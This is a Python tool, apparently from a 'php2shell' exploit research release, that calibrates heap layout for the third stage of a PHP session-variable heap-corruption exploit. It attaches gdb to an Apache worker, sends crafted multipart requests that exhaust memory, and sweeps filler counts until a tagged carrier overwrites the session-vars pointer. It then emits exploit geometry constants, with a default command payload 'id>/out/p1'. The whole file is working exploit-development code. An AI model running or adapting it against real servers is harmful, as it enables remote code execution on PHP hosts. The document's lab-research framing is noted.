#!/usr/bin/env python3
"""Heap-geometry calibration for the php2shell stage-3 carrier.

Why this tool exists
--------------------
Symbol offsets (zif_system / zval_ptr_dtor) travel with the libphp build, but
the *heap* geometry does not: it depends on memory_limit, post_max_size, the
session config, the application's RINIT allocations, and the shape of request
A.  Measured on one build at one memory_limit we have seen psv at
chunk+0x73000, +0x7a720 and +0x135160 for three different A shapes.  So the
stage-3 constants must be measured on the target, not copied.

What it measures
----------------
1. PS(http_session_vars) ("psv") for a sweep of --a-extra values.
2. The bin landing map for the carrier size you pass with --carrier-len:
   one B request carrying uniquely-tagged fillers of that size, so each filler
   index can be matched to the chunk-relative address it landed at.
3. From (1) and (2) it derives the (a_extra, f_pads) pair whose carrier data
   slot coincides with psv, and prints a ready-to-paste geometry tuple.

The rule it exploits: bin data slots are anchored on the page and satisfy
``addr % step == 0x18`` where ``step`` is the bin's slot stride.  A psv at
page+0x000 can therefore never be hit by a bin-40 carrier; the sweep finds an
a_extra whose psv lands on a real data slot of the requested bin.

Requirements
------------
* The target container must have CAP_SYS_PTRACE and gdb (or pass --gdb-exec to
  run gdb from a sidecar that shares the pid namespace).
* One worker (MaxRequestWorkers=1), because the A request OOMs the child.
* Authorized lab use only.

Usage
-----
  python3 tools/geo_cal.py --container php2shell-lab \
      --url http://127.0.0.1/index.php \
      --limit 128 --chunked --a-extra 0,4,8,...,36 --carrier-len 15

  # write the result straight into builds/index.json for this build
  python3 tools/geo_cal.py ... --emit-json
"""
from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

import profiles as profile_table  # noqa: E402  (needs ROOT on sys.path)

# PS(http_session_vars) inside php_ps_globals, per branch.  8.2 uses 0x140;
# reading 0x168 there yields send_cookie instead and every measurement is junk
# (docs/research/fpm-128m.md).
PSV_OFF_BY_BRANCH = {"8.2": 0x140, "8.3": 0x168, "8.4": 0x168, "8.5": 0x168}

# Token the carrier sweep looks for at psv.  It must be distinct from the
# filler bytes and from anything PHP writes, and short enough to fit the
# smallest carrier (15 bytes, of which the last ~4 are val.type/zero padding).
CARRIER_TAG = b"GCAL"

GDB_PROBE = r"""
set pagination off
set confirm off
set auto-load safe-path /
python
import gdb, re, struct
inf = gdb.selected_inferior()
base = None
for line in gdb.execute("info proc mappings", to_string=True).splitlines():
    if "libphp.so" in line:
        m = re.match(r"\s*(0x[0-9a-fA-F]+)", line)
        if m:
            base = int(m.group(1), 16); break

def u64(a):
    return struct.unpack("<Q", inf.read_memory(a, 8).tobytes())[0]

def hx(v):
    return "0x%x" % v

print("LIBPHP_BASE=" + (hx(base) if base else "NOTFOUND"), flush=True)
PSG = {ps_globals_expr}
PSV_OFF = {psv_off}
SPAN = 0x200000

class Shut(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*%s" % hx({shutdown_off} + base))

    def stop(self):
        report("SHUT")
        return False

class Init(gdb.Breakpoint):
    def __init__(self):
        super().__init__("*%s" % hx({init_off} + base))

    def stop(self):
        report("INIT")
        return False

def report(when):
    try:
        ref = u64(PSG + PSV_OFF)
    except gdb.MemoryError:
        print("PSVDATA %s unreadable" % when, flush=True)
        return
    if not ref:
        print("PSVDATA %s null" % when, flush=True)
        return
    chunk = ref & ~0x1FFFFF
    # "did the carrier land on psv" is exactly "does psv contain the carrier
    # bytes".  Do not scan the chunk for markers: the raw multipart body also
    # holds every part's bytes, which yields dozens of false hits.
    try:
        print("PSVDATA %s off=%s %s" % (when, hx(ref - chunk),
              inf.read_memory(ref, 0x20).tobytes().hex()), flush=True)
    except gdb.MemoryError:
        print("PSVDATA %s off=%s unreadable" % (when, hx(ref - chunk)),
              flush=True)

Shut()
Init()
end
continue
"""


def _probe_script(psv_off: int, shutdown_off: int, init_off: int,
                  mark_hex: str = "", ps_globals_off: int | None = None) -> str:
    """Fill the gdb template by token replacement.

    The body uses %-formatting internally, so str.format / % on the whole
    template would collide with it.

    `ps_globals_off` lets calibration work on a stripped libphp: when it is
    known, PS(http_session_vars) is read as libphp_base + offset + psv_off
    instead of relying on `&ps_globals` debug info (docs/research/t2-t3.md P0-C).
    """
    if ps_globals_off is None:
        psg = 'int(gdb.parse_and_eval("(unsigned long)&ps_globals"))'
    else:
        psg = "base + %d" % ps_globals_off
    return (GDB_PROBE
            .replace("{psv_off}", str(psv_off))
            .replace("{shutdown_off}", str(shutdown_off))
            .replace("{init_off}", str(init_off))
            .replace("{ps_globals_expr}", psg)
            .replace("{mark_hex}", mark_hex))


def sh(cmd: list[str], timeout: int = 120) -> str:
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return p.stdout
    except (OSError, subprocess.SubprocessError):
        return ""


def dk(container: str, *args: str, timeout: int = 120) -> str:
    return sh(["docker", "exec", container, *args], timeout=timeout)


def libphp_symbol(container: str, name: str) -> int | None:
    out = dk(container, "sh", "-c",
             f"nm /usr/lib/apache2/modules/libphp.so 2>/dev/null "
             f"| grep -E ' {name}$' | head -1")
    if not out.strip():
        out = dk(container, "sh", "-c",
                 f"nm /usr/local/lib/libphp.so 2>/dev/null "
                 f"| grep -E ' {name}$' | head -1")
    m = re.match(r"([0-9a-fA-F]+)", out.strip())
    return int(m.group(1), 16) if m else None


def php_version(container: str) -> str:
    out = dk(container, "php", "-r", "echo PHP_VERSION;")
    return out.strip() or "8.4"


def builder(url: str, container: str, args):
    # Lab-only helper: the lab-only legacy ``exploit.py`` is not part of this
    # MIT research release (docs/licensing.md).  Fail loudly instead of
    # silently depending on a file that is not shipped here.
    try:
        import exploit as E  # type: ignore[import-not-found]
    except ImportError as exc:  # pragma: no cover - lab-only path
        raise SystemExit(
            "geo_cal.py: builder() needs the lab-only legacy exploit.py "
            "(not part of this release -- see docs/licensing.md)"
        ) from exc

    t = E.Target(url, verbose=False)
    t.chunked = args.chunked
    prof = E.profile_table.resolve(args.profile)
    ex = E.Exploit(t, args.cmd, profile=prof, huge_mb=args.huge)
    return t, ex, E


def send_a(ex, E, a_extra: int):
    parts = [
        {"name": ex.session_name, "data": b"a" * 19},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
    ]
    for i, (nl, vl) in enumerate(ex.stage3_pads):
        nm = (f"p{i:0{nl - 1}d}" if nl > 0 else "")[:nl]
        parts.append({"name": nm, "data": b"V" * vl})
    for i in range(a_extra):
        parts.append({"name": f"x{i:02d}", "data": b"Z" * 7})
    parts += [ex._file_part(), ex._big_field()]
    try:
        ex.t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17,
                  read_cap=1 << 16, timeout=args_a_timeout(), chunked=ex.t.chunked)
    except OSError:
        return False
    return True


def args_a_timeout() -> float:
    return 250.0


def send_b(ex, E, size: int, count: int):
    parts = [
        {"name": ex.session_name, "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(count):
        body = b"MKSZ" + f"{i:04X}".encode()
        body += b"P" * max(0, size - len(body))
        parts.append({"name": f"f{i:04d}", "data": body})
    try:
        ex.t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10,
                  read_cap=1 << 16, timeout=180, chunked=ex.t.chunked)
    except OSError:
        return False
    return True


def send_carrier(ex, E, size: int, f_pads: int):
    """One B request: f_pads fillers, then a carrier tagged CARRIER_TAG."""
    parts = [
        {"name": ex.session_name, "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(f_pads):
        parts.append({"name": f"f{i:04d}", "data": b"F" * size})
    body = CARRIER_TAG + b"\x00" * max(0, size - len(CARRIER_TAG))
    parts.append({"name": "g00", "data": body[:size]})
    try:
        ex.t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10,
                  read_cap=1 << 16, timeout=180, chunked=ex.t.chunked)
    except OSError:
        return False
    return True


def worker_pid(container: str) -> int | None:
    out = dk(container, "sh", "-c", "pgrep -P 1 apache2 | head -1").strip()
    return int(out) if out.isdigit() else None


def restart_worker(container: str, url: str, settle: float = 8.0):
    """Kill stale gdb, restart the container, and make sure one child exists.

    A leftover gdb from a previous round keeps the old child stopped, so the
    next attach finds a pid that never runs the request and every measurement
    comes back empty.  Always clear it first and re-create the child with a GET.
    """
    dk(container, "sh", "-c", "pkill -9 -f gdb 2>/dev/null; true")
    sh(["docker", "restart", container], timeout=150)
    time.sleep(settle)
    for _ in range(10):
        sh(["curl", "-s", "-o", "/dev/null", "--max-time", "10", url])
        if worker_pid(container):
            time.sleep(0.5)
            return
        time.sleep(1.0)


def probe_once(container: str, gdb_script: str, log: str) -> str:
    """Install the script, attach gdb to the worker, return the breakpoint count."""
    dk(container, "sh", "-c", f": > {log}")
    dk(container, "sh", "-c", f"cat > /tmp/geocal.gdb <<'GEOF'\n{gdb_script}\nGEOF")
    pid = worker_pid(container)
    if not pid:
        return "0"
    sh(["docker", "exec", "-d", container, "sh", "-c",
        f"gdb -q -batch -p {pid} -x /tmp/geocal.gdb > {log} 2>&1"])
    time.sleep(5)
    return dk(container, "sh", "-c", f"grep -cE 'Breakpoint [0-9]' {log}").strip()


def preflight_container(container: str) -> str | None:
    """Return an error string if this container cannot host the calibration."""
    caps = sh(["docker", "inspect", "-f", "{{.HostConfig.CapAdd}}", container],
              timeout=30).strip()
    has_ptrace = "SYS_PTRACE" in caps
    gdb = dk(container, "sh", "-c", "command -v gdb || true").strip()
    if not gdb:
        return (f"{container} has no gdb.  Calibration needs to read ps_globals "
                f"inside the worker, so run it against a SYS_PTRACE copy of the "
                f"target (e.g. a -cal container built from the same image), not "
                f"the subject under test.")
    if not has_ptrace:
        return (f"{container} lacks CAP_SYS_PTRACE; gdb cannot attach to the "
                f"worker.  Add --cap-add=SYS_PTRACE to a copy of this container.")
    return None


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--container", required=True)
    ap.add_argument("--url", required=True)
    ap.add_argument("--profile", default="8.4.26")
    ap.add_argument("--limit", type=int, default=128)
    ap.add_argument("--huge", type=int, default=0,
                    help="big-field MiB (default: limit + 4)")
    ap.add_argument("--chunked", action="store_true")
    ap.add_argument("--a-extra", default="0,4,8,12,16,20,24,28,32,36",
                    help="comma list of a_extra values to sweep")
    ap.add_argument("--carrier-len", type=int, default=15,
                    help="carrier size: 15=bin40 23=bin48 31=bin56 39=bin64")
    ap.add_argument("--ps-globals", type=lambda x: int(x, 0), default=None,
                    help="address of php_ps_globals in libphp; when set, PS() "
                         "is read without debug symbols (default: built-in "
                         "profile for the target version)")
    ap.add_argument("--fills", type=int, default=200,
                    help="(legacy) fillers per landing-map request")
    ap.add_argument("--fpads-range", default="40,64",
                    help="LO,HI f_pads values to sweep for the carrier (default 40,64)")
    ap.add_argument("--cmd", default="id>/out/p1")
    ap.add_argument("--emit-json", action="store_true")
    ap.add_argument("--full-chain", action="store_true",
                    help="EXPERIMENTAL / UNRELIABLE.  Tries to measure psv inside "
                         "the real sequence (stage1 -> rotate -> stage2 -> rotate). "
                         "A's OOM kills the prefork child and gdb dies with it, so "
                         "the B request is served by a NEW child that gdb never "
                         "sees; the number printed is from an earlier request, not "
                         "from stage3.  Do not trust its output (docs/research/t2-t3.md §0.2).")
    args = ap.parse_args()

    if not args.huge:
        args.huge = args.limit + 4

    err = preflight_container(args.container)
    if err:
        print(f"ERROR: {err}", file=sys.stderr)
        return 2

    ver = php_version(args.container)
    branch = ".".join(ver.split(".")[:2])
    psv_off = PSV_OFF_BY_BRANCH.get(branch, 0x168)
    shut = libphp_symbol(args.container, "php_request_shutdown")
    init = libphp_symbol(args.container, "php_session_initialize")
    if shut is None or init is None:
        print("ERROR: cannot resolve php_request_shutdown / "
              "php_session_initialize in libphp", file=sys.stderr)
        return 2
    print(f"[*] {args.container}: PHP {ver} (branch {branch}) psv_off={psv_off:#x} "
          f"shutdown={shut:#x} session_init={init:#x}")
    psg_off = args.ps_globals
    if psg_off is None:
        # fall back to the built-in profile for this version, if it records one
        prof = profile_table.exact(ver)
        if prof is not None and prof.ps_globals_offset:
            psg_off = prof.ps_globals_offset
            print(f"[*] ps_globals=libphp+{psg_off:#x} (from profile {prof.name})",
                  flush=True)
    else:
        print(f"[*] ps_globals=libphp+{psg_off:#x} (explicit)", flush=True)

    t, ex, E = builder(args.url, args.container, args)
    step = {15: 0x28, 23: 0x30, 31: 0x38, 39: 0x40}.get(args.carrier_len)
    if step is None:
        print("ERROR: --carrier-len must be one of 15/23/31/39", file=sys.stderr)
        return 2

    # ---- phase 1: psv per a_extra -------------------------------------
    base_script = _probe_script(psv_off, shut, init, ps_globals_off=psg_off)
    if args.full_chain:
        print("[!] WARNING: --full-chain is unreliable.  A's OOM kills the child "
              "gdb is attached to, so the B request runs on a different child and "
              "the measured psv belongs to an earlier request.  See docs/research/t2-t3.md §0.2.",
              flush=True)
    psv_offs: dict[int, int] = {}
    for ax in [int(x) for x in args.a_extra.split(",") if x.strip()]:
        restart_worker(args.container, args.url)
        if probe_once(args.container, base_script, "/tmp/geocal.log") == "0":
            print(f"  a_extra={ax}: gdb attach failed, skipped")
            continue
        if args.full_chain:
            # Reproduce everything the exploit does before stage3.  Those extra
            # requests move psv (A-only said 0x73180, the real chain says
            # 0x550a0 on 128M), so an A-only number is unusable here.
            try:
                ex.stage1_candidates(limit=1)
                ex.rotate()
                ex.stage2()
                ex.rotate()
            except OSError:
                pass
        send_a(ex, E, ax)
        time.sleep(1.0)
        log = dk(args.container, "sh", "-c", "cat /tmp/geocal.log")
        # Several INIT/SHUT observations happen per round; the last non-null one
        # is the state stage3's A leaves behind.
        offs = [int(x, 16) for x in
                re.findall(r"PSVDATA \w+ off=(0x[0-9a-f]+)", log)]
        if not offs:
            print(f"  a_extra={ax}: no psv observed")
            continue
        off = offs[-1]
        if off < 0x1000:
            # A ps_globals field offset that does not match this branch yields
            # tiny/garbage values (8.3.35 measured 0x20 when read at +0x168).
            # Do not silently turn that into a "psv" and a phase.
            print(f"  a_extra={ax}: psv={off:#x} looks bogus (too low) - "
                  f"PSV_OFF for branch {branch} is probably wrong")
            continue
        psv_offs[ax] = off
        phase = off % step
        flag = " <== phase ok" if phase == 0x18 else ""
        print(f"  a_extra={ax}: psv=chunk+{off:#x} phase={phase:#x}{flag}")

    if not psv_offs:
        print("ERROR: no psv measurement succeeded", file=sys.stderr)
        return 3

    # ---- phase 2: landing map for the chosen carrier size ---------------
    cands = [ax for ax, off in psv_offs.items() if off % step == 0x18]
    if not cands:
        print("\n[!] none of the swept a_extra values gives phase 0x18 for "
              f"bin-{args.carrier_len}. Extend --a-extra or change --carrier-len.")
        return 4
    target_ax = cands[0]
    target_psv = psv_offs[target_ax]

    # Filler indices do NOT map linearly to f_pads: PHP also allocates each
    # field NAME, and those allocations sit between the value strings, so the
    # n-th filler is not the n-th bin slot.  Measure the carrier itself instead:
    # sweep f_pads and look for the run whose carrier marker lands on psv.
    print(f"\n[*] carrier sweep: a_extra={target_ax} "
          f"(psv=chunk+{target_psv:#x}) carrier={args.carrier_len}B")

    mark_script = _probe_script(psv_off, shut, init, ps_globals_off=psg_off)
    lo, hi = [int(x) for x in args.fpads_range.split(",")]
    found: int | None = None
    for f_pads in range(lo, hi + 1):
        restart_worker(args.container, args.url)
        if probe_once(args.container, mark_script, "/tmp/geocal.log") == "0":
            continue
        send_a(ex, E, target_ax)
        time.sleep(0.4)
        if not send_carrier(ex, E, args.carrier_len, f_pads):
            continue
        time.sleep(0.8)
        log = dk(args.container, "sh", "-c", "cat /tmp/geocal.log")
        # A round produces several PSVDATA lines (A's init/shutdown, B's
        # init/shutdown).  The carrier is in place at B's INIT and may already
        # be replaced by B's own reference at B's SHUT, so treat the round as a
        # hit if ANY observation shows the carrier tag at psv.
        raws = [bytes.fromhex(x) for x in
                re.findall(r"PSVDATA \w+ off=0x[0-9a-f]+ ([0-9a-f]+)", log)]
        hit = next((r for r in raws if r.startswith(CARRIER_TAG)), None)
        shown = hit or (raws[-1] if raws else b"")
        print(f"  f_pads={f_pads}: psv[0:4]={shown[:4].hex() or '-'} "
              f"({len(raws)} samples)"
              f"{'  <== CARRIER ON PSV' if hit else ''}")
        if hit:
            found = f_pads
            break

    if found is None:
        print(f"\n[!] no f_pads in {lo}..{hi} put the carrier on psv. "
              "Widen --fpads-range, or try a different --carrier-len.")
        return 5

    f_pads = found
    print(f"\n[+] f_pads={f_pads} places the carrier exactly on psv "
          f"(chunk+{target_psv:#x})")

    ht = 0x740D8
    print("\n[geometry]  limit=%d  a_extra=%d  f_pads=%d  htdata=%#x  "
          "carrier=%d  fill=%d" % (args.limit, target_ax, f_pads, ht,
                                   args.carrier_len, args.carrier_len))
    print("  tuple: (%d, %d, %d, %#x, %d, %d)" % (args.limit, target_ax, f_pads,
                                                   ht, args.carrier_len,
                                                   args.carrier_len))
    print("\n  NOTE: htdata above is a placeholder.  A fake-HashTable that lands "
          "at a different offset will silently fail; measure it with "
          "t2_marker_probe.gdb (15 x 167B copies, stride 0xC0) before trusting "
          "the tuple.  Also verify with a real proof: a carrier on psv is "
          "necessary but NOT sufficient (val.type must survive too).")

    if args.emit_json:
        path = os.path.join(ROOT, "builds", "index.json")
        with open(path, encoding="utf-8") as f:
            doc = json.load(f)
        sha = dk(args.container, "sh", "-c",
                 "sha256sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1").strip()
        for b in doc.get("builds", []):
            if b.get("libphp_sha256") == sha:
                geo = b.setdefault("stage3_geometry", [])
                row = [args.limit, target_ax, f_pads, hex(ht),
                       args.carrier_len, args.carrier_len]
                if row not in geo:
                    geo.append(row)
                print(f"[+] updated builds/index.json entry {b['id']}")
                break
        else:
            print("[!] no builds/index.json entry with this libphp sha256; "
                  "run tools/collect_build.py first", file=sys.stderr)
        with open(path, "w", encoding="utf-8") as f:
            json.dump(doc, f, indent=2)
            f.write("\n")
    return 0


if __name__ == "__main__":
    sys.exit(main())
